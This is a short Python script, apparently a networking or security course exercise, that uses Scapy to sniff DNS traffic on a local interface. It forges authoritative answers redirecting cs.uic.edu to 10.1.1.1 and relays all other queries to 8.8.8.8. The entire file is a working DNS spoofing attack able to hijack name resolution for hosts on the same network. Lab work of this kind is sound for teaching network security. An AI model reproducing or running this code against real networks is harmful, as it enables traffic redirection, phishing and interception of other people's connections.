from scapy.all import *
import socket

IFACE = "wlp0s20f3"   # Or your default interface
DNS_SERVER_IP = "127.0.0.1"  # Your local IP
localip = socket.gethostbyname(socket.gethostname())

BPF_FILTER = "udp port 53"

def dns_responder(local_ip: str):

    def forward_dns(orig_pkt: IP):
        print(f"Forwarding: {orig_pkt[DNSQR].qname}")
        response = sr1(
            IP(dst='8.8.8.8')/
                UDP(sport=orig_pkt[UDP].sport)/
                DNS(rd=1, id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname)),
            verbose=0,
        )
        resp_pkt = IP(dst=orig_pkt[IP].src, src=DNS_SERVER_IP)/UDP(dport=orig_pkt[UDP].sport)/DNS()
        resp_pkt[DNS] = response[DNS]
        send(resp_pkt, verbose=0)
        return f"Responding to {orig_pkt[IP].src}"

    def get_response(pkt: IP):
        if (
            DNS in pkt and
            pkt[DNS].opcode == 0 and
            pkt[DNS].ancount == 0
        ):
            if "cs.uic.edu" in str(pkt["DNS Question Record"].qname):
                spf_resp = IP(dst=pkt[IP].src,src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,ancount=1, aa=1,qr=1,an=DNSRR(rrname="cs.uic.edu",ttl=10, rdata='10.1.1.1')/DNSRR(rrname="cs.uic.edu",rdata='10.1.1.1'))
                spf_resp.show()
                print(spf_resp.summary())
                send(spf_resp, verbose=0, iface=IFACE,promisc=1)
                return f"Spoofed DNS Response Sent: {pkt[IP].src}"

            else:
                # make DNS query, capturing the answer and send the answer
                return forward_dns(pkt)

    return get_response

sniff(filter=BPF_FILTER, prn=dns_responder(localip), iface=IFACE)
